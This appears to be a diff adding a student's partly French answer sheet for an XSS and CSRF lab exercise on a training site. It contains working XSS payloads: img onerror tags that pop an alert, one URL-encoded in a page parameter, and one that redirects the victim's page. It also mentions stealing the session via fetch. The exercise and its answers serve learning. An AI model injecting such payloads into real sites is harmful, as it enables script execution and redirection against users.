@@ -1,1 +1,18 @@
-48
+question 1 : https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%27zzz.jpg%27%20onerror=%20alert(%27salo%27)%20%3E%3C/img%3E
+
+
+lvl 2 :
+question 1 : <img src='zzz.jpg' onerror= alert('xss') ></img> dans des
+
+question 2 : les script sont désac
+
+question 3 : via un fetch sur la session
+
+question 4 : <img src='zzz.jpg' onerror= document.location='sfgdh.html'; ></img> via img on change la location pour une page troll
+
+question 5 : 
+
+lvl 3 : 
+question 1 : 
+
+ 
